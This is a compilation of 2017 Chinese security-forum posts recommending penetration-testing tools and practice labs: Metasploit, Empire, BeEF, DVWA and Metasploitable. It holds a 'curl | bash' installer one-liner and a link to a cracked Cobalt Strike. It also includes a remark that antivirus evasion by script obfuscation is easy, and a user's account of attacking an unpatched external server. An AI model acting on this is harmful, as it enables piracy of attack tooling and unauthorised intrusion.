# Tools
<!-- 
子目录:
- [合集](#合集)
- [PoC/Exploit](#poc-exploit)
- [Metasploit](#metasploit)
- [cobaltstrike](#cobaltstrike)
- [Empire](#empire)
- [DVWA](#dvwa)
- [BeEF](#beef)
- [tcpdump](#tcpdump)
- [nmap](#nmap)
- [nc](#nc)
- [Kali](#kali)
- [Burp Suite](#burp-suite)
- [nethunter](#nethunter)
- [OSINT](#osint)
- [Secure Headers](#secure-headers)
- [Cracking](#cracking)
- [zANTI](#zanti)
- [XSS'OR](#xssor)
- [Proxy](#proxy)
- [cSploit](#csploit)
- [RAT](#rat)
- [Scanner](#scanner)
- [IDA](#ida)
- [SQLi](#sqli)
- [杂](#杂)
 -->

## 合集

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-28:


__#工具#__

渗透技能树之利器 v1

LanT34m 汇编整理 | 20170528 更新

这份“透技能树之利器”内容包括：

Windows、Linux、Tunnel、JavaScript、Browser、OSINT、Domain、Dir、Social-Engineer、Pentest、Exploit、Virus、Proxy、Java、CTF、DDoS、IoT、SSL、Web、Brute-Force、Fuzz、Port、Cyber、Search-Engineer、Wi-Fi、MITM、DNS、Docker、Android、OS、Defense、Hardware、Other

注1：这个仅分享在本圈，信息量不小，大家慢慢吸收，每个利器我们都玩过
注2：有的利器没加上链接，大家可以自行 Github/Google

详情见附件。


__分享文件:__
[渗透技能树之利器 v1.pdf](https://github.com/ChrisLinn/sst-2017/blob/master/shared-files/%E6%B8%97%E9%80%8F%E6%8A%80%E8%83%BD%E6%A0%91%E4%B9%8B%E5%88%A9%E5%99%A8%20v1.pdf)

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-12:


__#资源#__

  推荐 BlackHat Arsenal 兵工厂

兵工厂是全球黑帽大会（BlackHat）的一个重要环节，来自全球有能力的黑客在上面分享自己或团队独创的黑兵器。

这届，我看到官方开始号召大家共同维护这个 GitHub：


[GitHub - toolswatch/blackhat-arsenal-tools: Official Black Hat Arsenal Security Tools Repository](https://github.com/toolswatch/blackhat-arsenal-tools)

去年我带团队分享了三个黑兵器（ZoomEye、Seebug、Pocsuite），得到了官方的友谊和好评。

这里准备响应官方号召，把我们的东西更新上去。

这上面好兵器真不少，推荐大家收藏学习研究。顺便在此号召下，好东西如果不是非得私有化，可以考虑开源，并在一些国际大会上分享出来，这样的交流氛围多好，对吧？

<img src="https://images.xiaomiquan.com/FmCi7JzgmNxBNLAoPmFzD_7UESAS?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:-i5WP9J3HfjqYd6H7J2-7k5tu8g=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FgeMTRDBMhGl6b7HRnzvXc68QnWV?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PW_uM3bGEGqjn-I7SW56aMzNfdE=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/Fm8BLmQCC3QrngLBiCvGLIXmypdo?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:L025lT7sCaAKehX0elGQnvaKfi0=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-11-04:

> 匿名用户 提问：
你好群主，有没有自动化渗透的东东，能够节省渗透工作中的精力时间的经验或工具，希望能够分享下。


余弦之前推荐过：DeathStar、BloodHound，你GitHub上可以找到，不用谢。



---

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-11-10:


__#资讯#__

vault8 正确的打开方式

1. Download zip archive
2. make new directory, copy .git folder to there
3. cd to new directory
4. git reset --hard master


---

<img src="https://file.xiaomiquan.com/db/ce/dbcedb702dd5c5492dd767b6ca4573feb85d7a33fbd03f687408f6462185c575.jpg" width="25px"/> __myh0st__ on 2017-11-28:


__#基础#__

 bWAPP（buggy web Application）是一个集成了了常见漏洞的 web 应用程序，目的是作为漏洞测试的演练场（靶机），为 web 安全爱好者和开发人员提供一个测试平台，与 webgoat、dvwa 类似，小伙伴翻译的文章：

[BWAPP 玩法总结 - 信安之路](http://www.myh0st.cn/index.php/archives/420/)



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-30:


__#工具#__

 Parrot 渗透操作系统

渗透操作系统，远不止 Kali，只是 Kali 确实做得不错，但是这类操作系统可做性其实很大很大。Parrot 包括安全测试、软件开发、隐私保护许多专业的工具，这个操作系统也是基于
 Debian 深度定制的。

感兴趣的可以体验体验，不多说。


[https://www.parrotsec.org/](https://www.parrotsec.org/)




<img src="https://file.xiaomiquan.com/1fd/00/fd003c8da38c3c4d3c2de4a4f2286fc4cc258c70991a297508fe56574527708d.jpg" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/db/46/db463944dcee6d691b616604fe9fd3f08d518d7ae3ffd289fb5cd79f682e7b7b.jpg" width="25px"/> __sharecast__: 用过，比较酷炫，但还是kali比较稳定

<img src="https://file.xiaomiquan.com/67/bb/67bbb5369ba451685a372e01afdd96683e1151fa32304f23b6b7750d1ee5496a.jpg" width="25px"/> __荆轲__: 去年用了一段时间，bug多，不稳定。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-12-09:


__#经验#__ 

最近我们在给一支开发团队培训 Java 开发安全相关的知识，其中有一个资源给大家分享下：


[Bug Patterns - Find Security Bugs](http://find-sec-bugs.github.io/bugs.htm)


这个是“Find Security Bugs”，官方描述是：

The FindBugs plugin for security audits of Java web applications.

这个插件可以集成进 Java 主流的 IDE 里，非常方便进行基本的代码安全审计工作。

目前 125 个漏洞规则，整体过下来就可以对 Java 安全生态有个比较全面的了解。

最近 Struts2 爆的 S2-055（我前几天有发圈里），Jackson 反序列化的问题，Find Security Bugs 第一时间就超前集成了，这点很赞！




<img src="https://images.zsxq.com/FuQX963Wp0ECIo0pFC4h64AKQz4y?imageMogr2/auto-orient/thumbnail/320x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:M5ojCcYFvt1mxb3Ozln_j8rS61M=" width="50%" height="50%" align="middle"/>

<img src="https://images.zsxq.com/FjmKorDt-NywSMTSHUaxB7V7hsNJ?e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:l_-V9BSABl5wf6SsDMPXslmRda0=" width="50%" height="50%" align="middle"/>

<img src="https://images.zsxq.com/FoYVXM8frVbgREAf4zfRklU-0gS4?e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:6m0CzHgCyZwvDTRFiJ40EJAD-Wg=" width="50%" height="50%" align="middle"/>

<img src="https://images.zsxq.com/Fmna3vA5ZbNNOjLJDI6UdDvWc_b-?e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:b6rpEAR7x0TGw3Ho1JkJgD0JnyY=" width="50%" height="50%" align="middle"/>


---





## PoC Exploit

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-17:


__#工具#__

getsploit

本圈嘉宾@Moriarty  的分享。

getsploit

这是我用过的，迄今为止最好用的exploit搜索工具。首先，它支持在线搜索，它的exploit来自于 Exploit-DB, Metasploit, Packetstorm等等，并保持同步更新。它另一个更贴心的功能是可以指定-m参数，将搜索到的exploit自动下载下来（很方便的说）。另外它也支持离线，你只需要指定-u参数（--update），就可以将完整的exploit库离线到本地(目前数量大概在2亿2千万左右）。

项目地址：


[GitHub - vulnersCom/getsploit: Command line utilit...](https://github.com/vulnersCom/getsploit)



<img src="https://images.xiaomiquan.com/Fkbxi6FZacx-3UZORwxONU-uQ5Gg?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ckq-otnhitV3uiFizc_geTk-EHE=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FsrNMbhyZwPf5xtBMWsZPkpo8mbW?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:4bUuRoqH28JiuV3VWJ2uSdjs8jI=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: Python2.7.*内置sqlite3 并不支持FTS4 得下sqlite和Python源码编译 离线查询还得再折腾一下

<img src="https://file.xiaomiquan.com/48/65/48656b94e9e7832ed91ddb18cd8a7113a76b326cdbee625bccf6d77054dc1838.jpg" width="25px"/> __~~__: searchsploit也很好用啊，本身就是exploit-db的离线版，当然也支持查exploit的链接，也可以随时update

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/65/48656b94e9e7832ed91ddb18cd8a7113a76b326cdbee625bccf6d77054dc1838.jpg" width="25px"/> __~~__: 这个还包括其他db

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 居然有2亿多记录？？

<img src="https://file.xiaomiquan.com/34/67/34670901cfe95bb707b2e89bf45d6b8f30fd46af445923331ac80a871991f14b.jpg" width="25px"/> __咯吱咯__: 我想问下载那么多会不会给电脑带来压力……

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 另一个类似的：
[GitHub - 1N3/Findsploit: Find exploits in local an...](https://github.com/1N3/Findsploit)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/34/67/34670901cfe95bb707b2e89bf45d6b8f30fd46af445923331ac80a871991f14b.jpg" width="25px"/> __咯吱咯__: 不会吧


...

---

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-10-02:


__#资源#__

 

推荐个资源，国庆在家喝茶追剧也不忘关注威胁情报，这几天看到一个针对软件供应链攻击-Kingslayer的paper，无意中发现了一个“好玩”的资源。

PocOrGTFO，GTFO指Get The Fuck Out，意指对一切Backdoor的情绪表达，有点极客的味道。PocOrGTFO包含了一系列牛人写的Paper，关键字就是Poc，可谓“干货”满满，量很多，得啃很久～

链接：
[GitHub - filcab/pocorgtfo: Mirror for the PoC || G...](https://github.com/filcab/pocorgtfo)


当然，no starch press也出了纸质版（本人特别喜欢Paper里的一些插图），可谓是装B的利器。

BTW，这个出版社大家也可以关注一下，你看它官网上卖的什么书就知道了

官网地址：
[https://www.nostarch.com/](https://www.nostarch.com/)


---

## Metasploit

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-26:


__#姿势#__

  
__#工具#__

快速构建一台 Metasploit 渗透 VPS

官方有方案：


[Nightly Installers · rapid7/metasploit-framework W...](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)

 

仔细参考很容易。

如果你买的 VPS 内存小，那么可以这样来解决 MSF 启动的这个错误：

>virtual memory exhausted: Cannot allocate memory

```
# dd if=/dev/zero of=/swap bs=1024 count=1M
Format the swap file:
# mkswap /swap
Enable the swap file:
# swapon /swap
Enable swap on boot:
# echo "/swap swap swap sw 0 0" >> /etc/fstab
```

本质是加了个 swap 虚拟内存，用来解决物理内存过小导致的问题。

相关知识点请自行百度/Google。



...

<img src="https://file.xiaomiquan.com/df/db/dfdb475f56fe4b4b719dce753a972e44dde472d02173b528a841c3d4c41bcf1c.jpg" width="25px"/> __静候佳音__: 搬瓦工VPS表示没法增加虚拟内存swap😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/df/db/dfdb475f56fe4b4b719dce753a972e44dde472d02173b528a841c3d4c41bcf1c.jpg" width="25px"/> __静候佳音__: 我测试可以

<img src="https://file.xiaomiquan.com/b7/e6/b7e69b46a41fb2b83ead52c0ec57e5f92d63835489c4702b9b58e8c0f8c22136.jpg" width="25px"/> __木鸟__ replies to <img src="https://file.xiaomiquan.com/df/db/dfdb475f56fe4b4b719dce753a972e44dde472d02173b528a841c3d4c41bcf1c.jpg" width="25px"/> __静候佳音__: 
[Setup Swap File on Linux - Vultr.com](https://www.vultr.com/docs/setup-swap-file-on-linux)

<img src="https://file.xiaomiquan.com/87/9b/879b7fb72d1b5082d3b82c8fec4a8b6136a17fb3e41ee54782cedbd2f968de77.jpg" width="25px"/> __杰瑞121__: 想买VPS，请大家推荐一个

<img src="https://file.xiaomiquan.com/ef/32/ef32f19fb831b0e5c8605107f6d50eebc65382eaff5bebdb0285c0e623b1c231.jpg" width="25px"/> __红薯__ replies to <img src="https://file.xiaomiquan.com/87/9b/879b7fb72d1b5082d3b82c8fec4a8b6136a17fb3e41ee54782cedbd2f968de77.jpg" width="25px"/> __杰瑞121__: 我今天刚买了搬瓦工，你可以试试，速度很快

<img src="https://file.xiaomiquan.com/87/9b/879b7fb72d1b5082d3b82c8fec4a8b6136a17fb3e41ee54782cedbd2f968de77.jpg" width="25px"/> __杰瑞121__ replies to <img src="https://file.xiaomiquan.com/ef/32/ef32f19fb831b0e5c8605107f6d50eebc65382eaff5bebdb0285c0e623b1c231.jpg" width="25px"/> __红薯__: 谢谢

<img src="https://file.xiaomiquan.com/df/db/dfdb475f56fe4b4b719dce753a972e44dde472d02173b528a841c3d4c41bcf1c.jpg" width="25px"/> __静候佳音__ replies to <img src="https://file.xiaomiquan.com/b7/e6/b7e69b46a41fb2b83ead52c0ec57e5f92d63835489c4702b9b58e8c0f8c22136.jpg" width="25px"/> __木鸟__: 谢谢哦 但是显示无权限添加，据说是openvz无法自己加，我是256M的跑个WordPress就满了😂

<img src="https://file.xiaomiquan.com/c7/0e/c70e7f2914679c3ee81fe480ffd43b50fba930b7a160aba09eadbd6c4713c7d7.jpg" width="25px"/> __自牧__: 请问 512内存的VPS够用吗？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c7/0e/c70e7f2914679c3ee81fe480ffd43b50fba930b7a160aba09eadbd6c4713c7d7.jpg" width="25px"/> __自牧__: 没试过，至少一个G

<img src="https://file.xiaomiquan.com/c7/0e/c70e7f2914679c3ee81fe480ffd43b50fba930b7a160aba09eadbd6c4713c7d7.jpg" width="25px"/> __自牧__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 好的，谢谢余哥


...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-06-23:

__#工具#__ __#预告#__

Metasploit是一款开源的渗透测试框架，自从它问世，仿佛人人都可以成为一名黑客。当然Metasploit之所以能成为最优秀的黑客工具，不只因为它命令满屏幕飞的逼格，更因为其有着令人难以置信的安全检测和漏洞利用功能。尤其在内网渗透中，更是无往而不利。在接下来，我将以Metasploit为基础，向大家分享内网渗透相关的知识

Metasploit

项目地址：
[GitHub - rapid7/metasploit-framework: Metasploit F...](https://github.com/rapid7/metasploit-framework)


安装方法：
[Setting Up a Metasploit Development Environment · ...](https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment)



个人在渗透测试的时候，一般选择在VPS上搭建MSF（推荐，本圈前面有提），系统喜欢Ubuntu
如果嫌麻烦，也可以直接在本地用VMware安装kali2.0，自带msf。kali2.0安装方法：
[虚拟机安装kali2.0_百度经验](http://jingyan.baidu.com/article/93f9803f04e292e0e46f5533.html)





...

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 虚拟机的msf是不能外网渗透的吗？必须要外网环境才可以吗？（不是反弹shell那种，就单纯的像蓝屏攻击那种）

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 我好像没有理解到你的意思，这么说吧，无论你的msf搭在什么地方，只要可以让msf能访问到目标机器，直接访问也好，端口转发也好，socks代理也好，就能使用。你可以再具体描述一下情境

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 是不是不太会用虚拟机？

<img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 反弹shell需要外网IP我懂yy

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 对呀 就是我msf攻击虚拟机可以成功 攻击外网的没有打布丁的服务器不行 提示什么连不上rdp服务 但是3389开了的   不知道是exp不行还是网络问题😤

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 有防火墙吧

<img src="https://file.xiaomiquan.com/23/4f/234f71233cd7de9621f81fe36111b6a6cfe6a0292ea1aab5051ee0ae911c9e50.jpg" width="25px"/> __无意__: 我在centos7上装msf，装了一天都没装上，心都碎了

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ replies to <img src="https://file.xiaomiquan.com/23/4f/234f71233cd7de9621f81fe36111b6a6cfe6a0292ea1aab5051ee0ae911c9e50.jpg" width="25px"/> __无意__: 慢慢装(～o～)Y


...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-06-26:


__#资源#__

  MSF入门练习平台

了解并使用VMware搭建Metasploitable2。 Metasploitable2 是Metasploit团队维护的一个集成了各种漏洞弱点的Linux主机(ubuntu)镜像,方便广大黑扩跟安全人员进行MSF漏洞测试跟学习,免去搭建各种测试环境。 VMware: 直接打开Metasploitable.vmdk即可使用 登陆账号密码：msfadmin msfadmin

Metasploitable2下载地址:

[Metasploitable - Browse /Metasploitable2 at Source...](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/)



注：目前Metasploitable3也早就发布了，而且环境更贴近实战，不过Metasploitable2更适合MSF入门学习。
[Metasploitable 3正式发布，附赠全球CTF大赛 - FreeBuf.COM | 关注黑...](http://www.freebuf.com/news/122341.html)

---

## cobaltstrike

<img src="https://file.zsxq.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-12-26:

__#tools#__  

cobaltstrike3.8破解版 

[cobaltstrike3.8破解版 - 『安全工具区』 - 吾爱破解 - LCG - LSG |安...](https://www.52pojie.cn/thread-678903-1-1.html)


...

<img src="https://file.zsxq.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 现在是不是有3.10了 [呲牙]

<img src="https://file.zsxq.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 3.8破解版倒是有了很久了。就是插件还有很多没用过，ರ_ರ 心塞

<img src="https://file.zsxq.com/1e4/ba/e4ba90534396ff4031351efdb6ac2330c6b3712d7791622660b49164a9c677e3.jpeg" width="25px"/> __Moriarty@ATToT__: 不完全破解版……

...



---


## Empire



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-13:


__#工具#__

渗透利用神器 Empire 2.2 发布及一点看法


[Empire 2.2 – Maintaining an Empire – rvrsh3ll’s Bl...](http://www.rvrsh3ll.net/blog/empire/empire-2-2-maintaining-an-empire/)

 

优化了一些问题及增加了一些特性，英文很简单自己看吧。还可以搜搜本圈，之前也发过历史相关。这些 Red Team 牛人在加速 Empire 发展，下一版本说是直接跳到 3.0。

特别说下，Empire 估计不会特别去发展混淆 Empire 技术，他们觉得和杀软们玩打地鼠游戏没意思。其实这个我赞同，文件静态免杀应该自己来，脚本混淆多简单的事。Empire 在渗透其他方面如绕过、伪装、隐藏一直在提升，不过对抗是动态的，不断进化是必然的。

Empire 确实是很优秀的渗透利用框架（其实就是个远控）。Empire 生态能发展还有个重要特性：

REST API。



---


## DVWA



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:


__#姿势#__

  DVWA 漏洞测试环境的搭建过程

DVWA 有在我们的安全技能树里提到，以下是 Win10 下的搭建过程，来自@丹青  同学的分享，踏了一些坑，都解决了，感兴趣的同学可以参考。

如果你也有什么经验可以分享到圈子内的可以私信我交流。


1. 下载xampp,dvwa

2. 解压dvwa-master,把解压后的文件夹名字改为dvwa

3. 删除xampp文件夹里htdocs文件夹里的所有文件，然后把dvwa文件夹拷到htdocs文件夹里。

4. 把dvwa文件夹里的config文件的扩展名(.dist)去掉，编辑config文件的内容，把p@ssw0rd去掉

5. 用管理员权限打开xampp，点击start Apache,Mysql

6. 在浏览器端输入
`http://localhost/dvwa/setup.php`


7. 点击creat database，然后出现登录界面，用户名是admin,密码是password

8. 配置xampp控制台上的Apache,点击config中的PHP(php.ini),查找url_include,把它后面的Off改为On.

9. restart apache

10. 成功！！！

ps:xampp的下载地址:
[XAMPP Installers and Downloads for Apache Friends](https://www.apachefriends.org/zh_cn/index.html)



dvwa的下载地址:
[DVWA - Damn Vulnerable Web Application](http://www.dvwa.co.uk/)



视频教程地址:
[https://www.youtube.com/watch?v=cak2lQvBRAo&index=...](https://www.youtube.com/watch?v=cak2lQvBRAo&index=1&list=LLZ6KzzklgOHCRwQj8hNX89Q)





...

<img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 可以直接搭个metasploitable2啊，自带很多这种环境

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 不是一样的东西，也不影响这个分享

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 也可以，不过搭建过程好像对小白不是很友好😅

<img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__ replies to <img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 那个下载下来就是个虚拟机啊，打开直接用，根本不用搭建吧。。。

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 啊？不用配合其他虚拟平台吗？我刚刚去搜了一下这个东西，有一篇教程是在virtual box host 安装metasploitable2。。

<img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__ replies to <img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 默认下载的是做好的vmware的虚拟机

...

---

## BeEF

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-31:


__#工具#__

 浏览器利用框架 BeEF

BeEF(The Browser Exploitation Framework Project 的缩写) 是目前全球最好的开源浏览器利用框架，插件有很多，很值得参考学习。BeEF 这个缩写正好是牛肉的意思，所以玩这个玩多的人，一看到牛肉就想起了 BeEF。

玩前端黑客，如果能玩透 BeEF，在前端黑的利用方面就基本没什么大问题了，姿势非常的多。

命令行下一键安装方式：

`curl -L https://raw.githubusercontent.com/beefproject/beef/a6a7536e/install-beef | bash -s stable`

详细安装过程：

[Installation · beefproject/beef Wiki · GitHub](https://github.com/beefproject/beef/wiki/Installation)



使用：

`./beef`

BeEF 是基于 Ruby 编写的，数据库使用的是 SQLite。如果你正好在学 Ruby 且这么喜欢安全，BeEF 是个不错的参考。

<img src="https://images.xiaomiquan.com/FjDQ6Nw0ZqvMmhSrORs0wo5M2tvY?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:mpBU-9F8JgX-QlKiGFQC6iRUWW0=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/ea/96/ea96bcf10ea8375a897a730e31b78a4736703d02cffb7ddb58d1bcd6c159ad4a.jpg" width="25px"/> __CLSY.__: Kali 下有这个，免安装了

...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
余弦大大，我可以不可以把beef理解为一个网络探针，并顺便有着浏览器漏洞利用工具的一个框架


可以。



---

## tcpdump


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-21:


__#姿势#__

在做网络分析这块，推荐最原生的命令 tcpdump

“只要和网络沾边，都可以使用 tcpdump 来排查问题。”

这篇文章作为 tcpdump 指南来说可供参考，虽然来说还是简单点，不过大多时候，我们不是职业做流量分析的，够用：


[tcpdump 指南](https://zzyongx.github.io/blogs/tcpdump-tutorial.html)



我 N 年前因为要调试一套复杂架构的网络问题，第一次上了 tcpdump，并结合 Wireshark 在本机进行可视化分析，效果很直接，一些复杂的问题容易找出本质。



...

